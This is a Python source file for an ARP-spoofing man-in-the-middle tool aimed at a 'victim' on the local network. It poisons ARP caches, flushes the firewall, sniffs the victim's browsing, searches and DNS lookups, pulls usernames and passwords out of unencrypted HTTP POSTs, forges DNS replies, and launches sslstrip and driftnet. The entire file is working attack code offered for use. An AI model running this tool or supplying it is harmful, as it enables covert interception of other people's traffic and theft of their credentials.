#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
conf.checkIPaddr=0
import time
import sys
import threading
import argparse
import sys
import os
import signal
import urlparse
import commands
bash=commands.getoutput

#Check if root
if not os.geteuid()==0:
	sys.exit("\nPlease run as root\n")

#Create the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also prints searches. Use -uv to print all URLs.", action="store_true")
parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits including possible searches.", action="store_true")
parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
args = parser.parse_args()

class colors:
	PURPLE = '\033[95m'
	BLUE = '\033[94m'
	OKGREEN = '\033[92m'
	TAN = '\033[93m'
	RED = '\033[91m'
	ENDC = '\033[0m'

	def disable(self):
		self.HEADER = ''
		self.OKBLUE = ''
		self.OKGREEN = ''
		self.TAN = ''
		self.RED = ''
		self.ENDC = ''

#Find the gateway and use it as the router's info
routerCmd = bash('ip route')
routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', routerCmd)
routerIP = routerRE.group(1)
IPprefix = routerRE.group(2)
interface = routerRE.group(3)
localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]

print "Checking the DNS server..."
#dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
#ans, unans = srp(dhcp_discover, timeout=7, retry=2)
#if ans:
#	for p in ans:
try:
	DNSserver = dhcp_request()
	DNSserver = DNSserver[IP].src
	print "DNS server at:", DNSserver, '\n'
except:
	print "No answer to DHCP packet sent to find the DNS server. Setting DNS server to router IP.\n"
	DNSserver = routerIP

if args.ipaddress:
	victimIP = args.ipaddress
else:
	ans,unans = arping(IPprefix+'*')
	for s,r in ans:
		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
		print ips
	victimIP = raw_input('\nType victim\'s IP: ')

def originalMAC(ip):
	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
	for s,r in ans:
		return r.sprintf("%Ether.src%")

def poison(routerIP, victimIP):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))

def restore(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

def URL(pkt):
#   Counter is to make sure we're not printing packet data twice if both username and password is found
	counter = 0
#	We add pkt[Ether].src check to make sure we're not messing with retransmitted packets
	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
		pkt = repr(pkt[Raw].load)
		try:
			headers, body = pkt.split(r"\r\n\r\n")
		except:
			headers = pkt
			body = ''

		def search(url):
			searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
			if searched:
				searched = searched.group(3)
				searched = searched.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
				print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC

		post = re.search('POST /', headers)
		get = re.search('GET /', headers)
		host = re.search('Host: ', headers)

#The big unsolvable problem is that sometimes sniff() will get a packet (usually from the arp spoofed victim)
#and split it into 2 packets when wireshark sees only one. Consistently from neopets via arpspoof victim. The load
#gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
#http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/
		if args.post and len(headers) < 450 and not get:
			username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
			for u in username:
				if u:
					print colors.TAN,'[+] Packet was split by accident. Data:',headers, colors.ENDC
					print colors.RED,u.group(),colors.ENDC
					counter = 1
			for p in password:
				if p:
					if counter == 0:
						print colors.TAN, '[+] Packet was split by accident. Data:', headers, colors.ENDC
					print colors.RED, p.group(), colors.ENDC
			counter = 0
		if (post or get) and host:
			a = headers.split(r"\r\n")
			try:
				b = a[0].split(" ")
				c = a[1].split(" ")
				url = c[1]+b[1]
			except:
				print "Could not form url"
				return
			if args.post and post:
				if body != '':
					print colors.TAN+'[+] POST:',url,'HTTP POST load:',body+colors.ENDC
					password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
					username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
					for u in username:
						if u:
							print colors.RED,u.group(),colors.ENDC
					for p in password:
						if p:
							print colors.RED,p.group(),colors.ENDC
			if args.urlspy:
				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
				if any(i in url for i in d):
					return
				print url
				search(url)
			if args.verboseURL:
				print url
				search(url)

def DNSreq(pkt):
	if pkt.haslayer(DNSQR):
		dnsreq = pkt[DNSQR].qname
		print dnsreq

def mkspoof(DNSpkt):
	ip=DNSpkt[IP]
	dnsLayer=DNSpkt[DNS]
#	qr = query or response (0,1), aa=are the nameservers authoritative? (0,1), ad=authenticated data (0,1)
	p = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dnsLayer.id, qr=1, aa=1, qd=dnsLayer.qd, an=DNSRR(rrname=dnsLayer.qd.qname, ttl=10, rdata=localIP))
	return p

class urlspy(threading.Thread):
	def run(self):
#		This is in case you need to test the program without an actual victim
#		sniff(store=0, filter='port 80', prn=URL, iface=interface)
		sniff(store=0, filter='port 80 and host %s' % victimIP, prn=URL, iface=interface)

class dnsspy(threading.Thread):
	def run(self):
		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNSreq, iface=interface)

class dnsspoof(threading.Thread):
	def run(self):
		while 1:
			a=sniff(filter='port 53 or port 80 and host %s' % victimIP, count=1, promisc=1)
			DNSpkt = a[0]
			if not DNSpkt.haslayer(DNSQR):
				continue
			if args.dnsspoof in DNSpkt.qd.qname:
				send(mkspoof(DNSpkt))
				print colors.OKGREEN + '[+] Spoofed:', DNSpkt.qd.qname + colors.ENDC

class sslstrip(threading.Thread):
	def run(self):
		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
		sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')

class driftnet(threading.Thread):
	def run(self):
		driftnet = bash('xterm -e driftnet -i %s' % interface)

print "Active interface = " + interface
print "Router IP = " + routerIP
print "Client IP = " + victimIP
try:
	routerMAC = originalMAC(routerIP)
	print "Router MAC: " + routerMAC
	victimMAC = originalMAC(victimIP)
	print "Victim MAC: " + victimMAC + "\n"
except:
	sys.exit("Could not get MAC addresses")

def main():

	#Forward packets and flush iptables
	ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
	ipF = bash('iptables -F')
	ipNATF = bash('iptables -t nat F')
	ipX = bash('iptables -X')
	ipNATX = bash('iptables -t nat -X')
	print 'Enabled IP forwarding and flushed the firewall\n'

	if args.urlspy or args.google or args.verboseURL or args.post or args.search:
		ug = urlspy()
		#Make sure the thread closes with the main program on Ctrl-C
		ug.daemon = True
		ug.start()

	if args.dnsspy:
		dt = dnsspy()
		dt.daemon = True
		dt.start()

	if args.driftnet:
		dr = driftnet()
		dr.daemon = True
		dr.start()

	if args.sslstrip:
		ssl = sslstrip()
		ssl.daemon = True
		ssl.start()

	if args.dnsspoof:
		ds = dnsspoof()
		ds.daemon = True
		ds.start()

	def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		restore(routerIP, victimIP, routerMAC, victimMAC)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		ipforwardoff = bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
		flush1 = bash('iptables -t nat -F')
		flush2 = bash('iptables -F')
		flush3 = bash('iptables -X')
		sys.exit(0)

	signal.signal(signal.SIGINT, signal_handler)


	while 1:

		poison(routerIP, victimIP)
		if not DNSserver == routerIP:
			poison(DNSserver, victimIP)
		time.sleep(1.5)


if __name__ == "__main__":
	main()
